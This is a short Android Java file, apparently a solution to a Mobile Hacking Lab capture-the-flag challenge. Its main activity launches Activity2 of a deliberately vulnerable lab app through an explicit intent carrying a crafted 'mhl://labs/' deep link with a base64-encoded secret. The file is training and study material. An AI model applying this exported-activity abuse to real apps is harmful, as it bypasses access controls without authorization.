public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        
         Uri uri = Uri.parse("mhl://labs/bWhsX3NlY3JldF8xMzM3");
         Intent intent = new Intent("android.intent.action.VIEW");
         intent.setClassName("com.mobilehackinglab.challenge", "com.mobilehackinglab.challenge.Activity2");
         intent.setData(uri);
         startActivity(intent);

    }
}